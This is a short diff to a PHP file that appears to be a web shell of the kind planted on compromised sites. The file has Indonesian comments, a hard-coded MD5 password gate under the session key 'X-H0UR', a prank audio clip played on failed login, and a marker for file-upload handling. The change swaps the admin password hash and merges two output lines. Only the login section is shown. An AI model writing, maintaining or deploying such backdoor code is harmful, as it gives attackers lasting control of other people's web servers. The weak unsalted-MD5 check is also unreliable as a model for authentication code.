@@ -7,7 +7,7 @@ return isset($_SESSION['X-H0UR']);
 }
 // Fungsi untuk memvalidasi login
 function login($password) {
-$valid_password_hash = 'e13b6aea939bf6c221142ec099e2ee01'; // MD5 isc2k17 EDITON PASSWORD DEFAULT ADMIN
+$valid_password_hash = 'e6d037be0f9413ca1751cce755f342ab'; // MD5 isc2k17 EDITON PASSWORD DEFAULT ADMIN
 $password_hash = md5($password);
 if ($password_hash === $valid_password_hash) {
 $_SESSION['X-H0UR'] = 'user';
@@ -46,7 +46,7 @@ header('Location: ' . $_SERVER['PHP_SELF']);
 exit;
 } else {
 $error_message = "Password salah!";
-echo '<audio autoplay><source src="https://cvar1984.github.io/audio/moan.mp3" type="audio/mpeg"></audio>';echo '<script>alert("' . $error_message . '");</script>';
+echo '<audio autoplay><source src="https://cvar1984.github.io/audio/moan.mp3" type="audio/mpeg"></audio><script>alert("' . $error_message . '");</script>';
 }
 }
 // Tangani proses unggah file
